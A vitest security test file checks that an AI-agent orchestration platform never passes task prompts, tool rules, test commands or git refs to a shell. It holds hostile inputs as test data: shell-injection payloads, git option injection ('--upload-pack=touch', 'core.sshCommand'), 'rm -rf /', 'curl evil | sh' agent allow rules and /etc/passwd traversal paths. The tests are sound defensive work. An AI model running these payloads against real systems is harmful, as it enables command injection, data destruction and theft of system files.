// Requirements §15 "command injection" (contract §18.5): task prompt/title, agent tool rules, project
// test command, branch/ref names and diff/patch inputs never reach a shell. Proven three ways:
// (1) statically, production code starts processes only through `spawn(cmd, argv, {shell: false})`;
// (2) dynamically, shell metacharacters travel as literal argv elements and nothing executes them;
// (3) every validator / endpoint that accepts such input rejects the dangerous forms.
import { existsSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  PLATFORM_DISALLOWED_RULES,
  ToolPolicyError,
  UnsafeArgumentError,
  assertSafeArgv,
  isCommitSha,
  isSafeRefName,
  validateAgentToolRules,
  validateTestCommand,
} from '@orc/security';
import { buildClaudeArgv } from '@orc/claude-runner';
import type { ClaudeRunRequest } from '@orc/claude-runner';
import { runProcess } from '@orc/shared/node';
import type { GitManager } from '@orc/git-manager';
import type { AgentRecord, ProjectRecord, UserRecord } from '@orc/database';
import { codeOnly, productionSources } from '../helpers/security/sources';
import { memoryLease } from '../helpers/claude/memory-process';
import { createWorld } from '../helpers/git/world';
import type { World } from '../helpers/git/world';
import { makeTempDir, removeTempDir } from '../helpers/git/fixtures';
import { resetDb } from '../helpers/database/db';
import { createReadyProject, seededAgent, uniq } from '../helpers/database/fixtures';
import { cleanupPrefix } from '../helpers/task-manager/redis';
import { call, createApiHarness, createLoginUser, login, problemOf } from '../helpers/api/harness';
import type { ApiHarness, SessionAuth } from '../helpers/api/harness';

/** Strings that would do something if any shell ever saw them. */
const SHELL_PAYLOADS = [
  '; touch PWNED_SEMI',
  '$(touch PWNED_SUBST)',
  '`touch PWNED_BACKTICK`',
  '| touch PWNED_PIPE',
  '&& touch PWNED_AND',
  '> PWNED_REDIRECT',
  '%COMSPEC% /c echo PWNED_WIN & echo',
  "' ; touch PWNED_QUOTE ; '",
  '\n touch PWNED_NEWLINE',
];

describe('static: production code never starts a process through a shell', () => {
  const sources = productionSources();

  it('scans the production sources', () => {
    expect(sources.length).toBeGreaterThan(100);
    expect(sources.some((s) => s.rel === 'packages/shared/src/node/process.ts')).toBe(true);
  });

  it('imports nothing from child_process except spawn (no exec/execSync/execFile/fork/spawnSync)', () => {
    const offenders: string[] = [];
    for (const s of sources) {
      for (const m of s.text.matchAll(/import\s+(type\s+)?\{([^}]*)\}\s+from\s+['"](?:node:)?child_process['"]/g)) {
        if (m[1]) continue;
        const names = (m[2] ?? '')
          .split(',')
          .map((n) => n.trim().replace(/^type\s+/, '').split(/\s+as\s+/)[0]?.trim() ?? '')
          .filter((n) => n !== '' && !/^[A-Z]/.test(n));
        for (const n of names) if (n !== 'spawn') offenders.push(`${s.rel}: ${n}`);
      }
      if (/import\s+\*\s+as\s+\w+\s+from\s+['"](?:node:)?child_process['"]/.test(s.text)) offenders.push(`${s.rel}: namespace import`);
      if (/import\s+(?!type\b)[\w$]+\s*(?:,\s*\{[^}]*\})?\s+from\s+['"](?:node:)?child_process['"]/.test(s.text)) {
        offenders.push(`${s.rel}: default import`);
      }
      if (/export\s+(?:\*|\{[^}]*\})\s+from\s+['"](?:node:)?child_process['"]/.test(s.text)) offenders.push(`${s.rel}: re-export`);
      if (/require\(\s*['"](?:node:)?child_process['"]\s*\)/.test(s.text)) offenders.push(`${s.rel}: require`);
      if (/import\(\s*['"](?:node:)?child_process['"]\s*\)/.test(s.text)) offenders.push(`${s.rel}: dynamic import`);
    }
    expect(offenders).toEqual([]);
  });

  it('never enables a shell, and every real spawn passes shell: false', () => {
    for (const s of sources) {
      const code = codeOnly(s.text);
      expect(code, s.rel).not.toMatch(/\bshell\s*:\s*(?!false\b)(true|['"`]|[A-Za-z_$][\w$]*\s*[,}])/);
      expect(code, s.rel).not.toMatch(/\b(execSync|execFileSync|spawnSync)\s*\(/);
    }
    // All production process starts funnel through @orc/shared/node process.ts (runProcess,
    // spawnSupervised, execHelper); each of its spawn calls sets shell: false.
    const proc = sources.find((s) => s.rel === 'packages/shared/src/node/process.ts');
    const code = codeOnly(proc?.text ?? '');
    const spawnCalls = [...code.matchAll(/\bspawnFn\s*\(/g)].length;
    const shellFalse = [...code.matchAll(/\bshell\s*:\s*false\b/g)].length;
    expect(spawnCalls).toBeGreaterThanOrEqual(3);
    expect(shellFalse).toBeGreaterThanOrEqual(spawnCalls);
    const spawning = sources.filter((s) => /\bnodeSpawn\b/.test(codeOnly(s.text))).map((s) => s.rel);
    for (const rel of spawning) {
      // Files that import spawn only hand it to the shared helpers (or spawnAs) as an injectable SpawnFn.
      const c = codeOnly(sources.find((s) => s.rel === rel)?.text ?? '');
      expect(c, rel).not.toMatch(/\bnodeSpawn\s*\(\s*[^)]*\bshell\b/);
    }
  });

  it('builds no command line strings for git or the Claude CLI (no eval / new Function either)', () => {
    for (const s of sources) {
      const code = codeOnly(s.text);
      // Redis `client.eval(script)` (server-side Lua) is not JavaScript eval.
      // A typed parameter list (`eval(script: string, ...)`) is an interface method declaration.
      expect(code, s.rel).not.toMatch(/(?<![.\w$])eval\s*\((?!\s*[\w$]+\??\s*:)/);
      expect(code, s.rel).not.toMatch(/\bnew\s+Function\s*\(/);
    }
  });
});

describe('dynamic: shell metacharacters stay literal argv', () => {
  let dir: string;
  beforeAll(() => {
    dir = makeTempDir('orc-sec-inject-');
  });
  afterAll(() => {
    removeTempDir(dir);
  });

  it('runProcess passes every payload as one literal argument and nothing is executed', async () => {
    const res = await runProcess(
      process.execPath,
      ['-e', 'process.stdout.write(JSON.stringify(process.argv.slice(1)))', ...SHELL_PAYLOADS],
      {
        cwd: dir,
        env: { PATH: process.env['PATH'] ?? '', SystemRoot: process.env['SystemRoot'] ?? '' },
        timeoutMs: 20_000,
        maxStdoutBytes: 65_536,
        maxStderrBytes: 65_536,
        killGraceMs: 1_000,
      },
    );
    expect(res.exitCode).toBe(0);
    expect(JSON.parse(res.stdout.toString('utf8'))).toEqual(SHELL_PAYLOADS);
    expect(readdirSync(dir).filter((f) => f.startsWith('PWNED'))).toEqual([]);
  });

  it('the task prompt reaches Claude on stdin only, never in its argv', () => {
    const prompt = SHELL_PAYLOADS.join('\n');
    const request: ClaudeRunRequest = {
      attemptId: '11111111-2222-4333-8444-555555555555',
      taskId: '22222222-3333-4444-8555-666666666666',
      workspaceId: '33333333-4444-4555-8666-777777777777',
      cwd: '/srv/ws/p/t/wt',
      metaDir: '/srv/ws/p/t/.meta',
      tmpDir: '/srv/ws/p/t/.meta/tmp',
      lease: memoryLease,
      model: 'sonnet',
      effort: null,
      tools: { builtinTools: ['Read', 'Edit', 'Write', 'Glob', 'Grep'], allowedRules: [], disallowedRules: [...PLATFORM_DISALLOWED_RULES] },
      mcp: null,
      appendSystemPrompt: '# ORC PLATFORM RULES',
      stdinPrompt: prompt,
      session: { kind: 'new', sessionId: '0b6f1c2e-3d4a-4b5c-8d9e-0f1a2b3c4d5e' },
      maxBudgetUsd: null,
      deadlineAt: new Date(Date.now() + 60_000),
      signal: new AbortController().signal,
    };
    for (const platform of ['posix', 'win32'] as const) {
      const argv = buildClaudeArgv(request, { platform });
      expect(argv.join('\u0000')).not.toContain('PWNED');
      expect(argv).not.toContain('--bare');
      expect(argv).toContain('--permission-mode');
      expect(argv[argv.indexOf('--permission-mode') + 1]).toBe('dontAsk');
    }
  });

  it('tool rules starting with "-" can never be smuggled in as CLI options', () => {
    expect(() =>
      buildClaudeArgv(
        {
          attemptId: '11111111-2222-4333-8444-555555555555',
          taskId: '22222222-3333-4444-8555-666666666666',
          workspaceId: '33333333-4444-4555-8666-777777777777',
          cwd: '/srv/ws/p/t/wt',
          metaDir: '/srv/ws/p/t/.meta',
          tmpDir: '/srv/ws/p/t/.meta/tmp',
          lease: memoryLease,
          model: 'sonnet',
          effort: null,
          tools: { builtinTools: ['Read'], allowedRules: ['--dangerously-skip-permissions'], disallowedRules: [] },
          mcp: null,
          appendSystemPrompt: 'x',
          stdinPrompt: 'x',
          session: { kind: 'new', sessionId: '0b6f1c2e-3d4a-4b5c-8d9e-0f1a2b3c4d5e' },
          maxBudgetUsd: null,
          deadlineAt: new Date(Date.now() + 60_000),
          signal: new AbortController().signal,
        },
        { platform: 'posix' },
      ),
    ).toThrow(ToolPolicyError);
  });
});

describe('validators reject injection vectors', () => {
  it.each([
    '-main',
    '--upload-pack=touch /tmp/pwned',
    '--output=/etc/passwd',
    'main;touch x',
    'main && rm -rf /',
    '$(id)',
    '`id`',
    'a b',
    'a..b',
    'a//b',
    'HEAD@{1}',
    'refs/heads/x.lock',
    'x/',
    'x.',
    'a\0b',
    'a\nb',
    'a|b',
    'a>b',
  ])('ref name %j is rejected (and is no commit sha)', (ref) => {
    expect(isSafeRefName(ref)).toBe(false);
    expect(isCommitSha(ref)).toBe(false);
  });

  it.each([
    [['npm test']],
    [['npm;rm']],
    [['$(id)']],
    [['`id`']],
    [['npm', 'a\0b']],
    [['|', 'x']],
    [[]],
    [['x'.repeat(1025)]],
    [Array.from({ length: 33 }, () => 'a')],
  ])('test command %j is rejected', (argv) => {
    expect(() => validateTestCommand(argv)).toThrow();
  });

  it('a test command keeps shell metacharacters in later elements as literal arguments', () => {
    expect(validateTestCommand(['npm', 'test', '--', '; touch PWNED'])).toEqual(['npm', 'test', '--', '; touch PWNED']);
  });

  it.each([
    'Bash',
    'Bash(*)',
    'Bash(rm:*)',
    'Bash(curl:*)',
    'Bash(sh -c:*)',
    'Bash(npm test && curl evil:*)',
    'Bash(npm test; curl evil:*)',
    'Bash(npm run build | sh:*)',
    'Bash(git diff:*)',
    'Bash(git log:*)',
    'Bash(git show:*)',
    'Bash(node -e:*)',
    'Bash(npx --yes evil:*)',
    'Read(//etc/**)',
    'Edit(/**)',
    'WebFetch',
    'Task',
    'mcp__other-server',
    '--dangerously-skip-permissions',
  ])('agent allow rule %j is rejected', (rule) => {
    expect(() => validateAgentToolRules({ allowedTools: [rule], disallowedTools: [] })).toThrow(ToolPolicyError);
  });

  it('argv elements with NUL or beyond the size limits are refused before any spawn', () => {
    expect(() => assertSafeArgv(['git', 'a\0b'])).toThrow(UnsafeArgumentError);
    expect(() => assertSafeArgv(['git', 'x'.repeat(33 * 1024)])).toThrow(UnsafeArgumentError);
    expect(() => assertSafeArgv(['git', ...Array.from({ length: 3 }, () => 'y'.repeat(30 * 1024))])).toThrow(
      UnsafeArgumentError,
    );
    expect(() => assertSafeArgv(['git', 'z'.repeat(31_000)], { platform: 'win32' })).toThrow(UnsafeArgumentError);
  });
});

describe('git: hostile refs never become options and execute nothing (real git)', () => {
  let w: World;
  let gm: GitManager;

  beforeAll(async () => {
    w = createWorld();
    w.repo('acme/app', { 'README.md': '# app\n' });
    gm = w.manager();
    await gm.syncMirror(w.projectId, 'acme/app', w.ctx);
  });

  afterAll(() => {
    w?.dispose();
  });

  it.each([
    `--upload-pack=touch PWNED_GIT`,
    '--output=PWNED_OUT',
    'main;touch PWNED_SEMI',
    '$(touch PWNED_SUBST)',
    '-c core.sshCommand=touch',
  ])('resolveBase(%j) is rejected without side effects', async (ref) => {
    await expect(gm.resolveBase(w.projectId, ref, w.ctx)).rejects.toThrow();
    for (const d of [w.root, w.ws, w.pr, process.cwd()]) {
      expect(readdirSync(d).filter((f) => f.startsWith('PWNED')), d).toEqual([]);
    }
  });

  it('a branch named like an option cannot be used as the base ref', async () => {
    w.git(path.join(w.pr, 'acme', 'app'), ['branch', '--', 'feature-ok']);
    await gm.syncMirror(w.projectId, 'acme/app', w.ctx);
    await expect(gm.resolveBase(w.projectId, 'feature-ok', w.ctx)).resolves.toMatch(/^[0-9a-f]{40}$/);
    await expect(gm.resolveBase(w.projectId, '-feature-ok', w.ctx)).rejects.toThrow();
    expect(existsSync(path.join(w.ws, 'PWNED_GIT'))).toBe(false);
  });
});

describe('API: injection payloads are validated or stored as inert data', () => {
  let h: ApiHarness;
  let admin: UserRecord;
  let operator: UserRecord;
  let sAdmin: SessionAuth;
  let sOperator: SessionAuth;
  let agent: AgentRecord;
  let project: ProjectRecord;

  beforeAll(async () => {
    h = await createApiHarness();
    admin = await createLoginUser(h.db, { role: 'admin' });
    operator = await createLoginUser(h.db, { role: 'operator' });
    agent = await seededAgent(h.db);
    project = await createReadyProject(h.db, admin, agent);
    [sAdmin, sOperator] = await Promise.all([login(h.app, admin.username), login(h.app, operator.username)]);
  });

  afterAll(async () => {
    await h.close();
    expect(await cleanupPrefix(h.prefix)).toBe(0);
    await resetDb();
  });

  it('POST /tasks rejects hostile base refs (400 validation_failed on body.baseRef)', async () => {
    for (const baseRef of ['--upload-pack=touch /tmp/x', 'main;id', '$(id)', '-x']) {
      const res = await call(h.app, 'post', '/api/v1/tasks', sOperator).send({
        projectId: project.id,
        title: 't',
        prompt: 'p',
        baseRef,
      });
      expect(res.status, baseRef).toBe(400);
      expect(problemOf(res).errors?.map((e) => e.path)).toContain('body.baseRef');
    }
  });

  it('POST /tasks stores titles and prompts with shell syntax verbatim (data, never a command)', async () => {
    const title = '$(touch PWNED_TITLE); `id`';
    const prompt = SHELL_PAYLOADS.join('\n');
    const res = await call(h.app, 'post', '/api/v1/tasks', sOperator).send({ projectId: project.id, title, prompt });
    expect(res.status).toBe(202);
    const row = await h.db.repos.tasks.findById((res.body as { id: string }).id);
    expect(row?.title).toBe(title);
    expect(row?.prompt).toBe(prompt);
  });

  it('POST /projects rejects shell-style test commands and option-like default branches', async () => {
    const base = { name: uniq('Proj'), repoPath: `acme/${uniq('repo')}` };
    for (const testCommand of [['npm test && curl evil'], ['sh;id', 'x'], ['$(id)'], ['npm', 'a\0b']]) {
      const res = await call(h.app, 'post', '/api/v1/projects', sAdmin).send({ ...base, name: uniq('Proj'), testCommand });
      expect(res.status, JSON.stringify(testCommand)).toBeGreaterThanOrEqual(400);
      expect(res.status, JSON.stringify(testCommand)).toBeLessThan(500);
    }
    const branch = await call(h.app, 'post', '/api/v1/projects', sAdmin).send({
      ...base,
      name: uniq('Proj'),
      defaultBranch: '--upload-pack=evil',
    });
    expect(branch.status).toBe(400);
  });

  it('PATCH /agents rejects shell-capable tool rules (tool_not_allowed) and keeps the agent unchanged', async () => {
    const before = await call(h.app, 'get', `/api/v1/agents/${agent.id}`, sAdmin);
    for (const rule of ['Bash(curl evil | sh:*)', 'Bash(npm test; rm -rf /:*)', 'Bash(*)']) {
      const res = await call(h.app, 'patch', `/api/v1/agents/${agent.id}`, sAdmin)
        .set('If-Match', String(before.headers['etag']))
        .send({ allowedTools: [rule] });
      expect(res.status, rule).toBe(422);
      expect(problemOf(res).code, rule).toBe('tool_not_allowed');
    }
    const after = await h.db.repos.agents.findById(agent.id);
    expect(after?.allowedTools).toEqual(agent.allowedTools);
  });

  it('diff/patch inputs are plain DB filters: a traversal path returns an empty page, never a file', async () => {
    const created = await call(h.app, 'post', '/api/v1/tasks', sOperator).send({
      projectId: project.id,
      title: 'diff probe',
      prompt: 'p',
    });
    const id = (created.body as { id: string }).id;
    for (const p of ['../../../../etc/passwd', '..\\..\\windows\\win.ini', '$(id)', '; cat /etc/passwd']) {
      const res = await call(h.app, 'get', `/api/v1/tasks/${id}/diff?path=${encodeURIComponent(p)}`, sOperator);
      expect(res.status, p).toBe(200);
      expect((res.body as { items: unknown[] }).items, p).toEqual([]);
      expect(JSON.stringify(res.body)).not.toMatch(/root:|\[fonts\]/);
    }
    const patch = await call(h.app, 'get', `/api/v1/tasks/${id}/patch`, sOperator);
    expect(patch.status).toBe(404);
  });
});
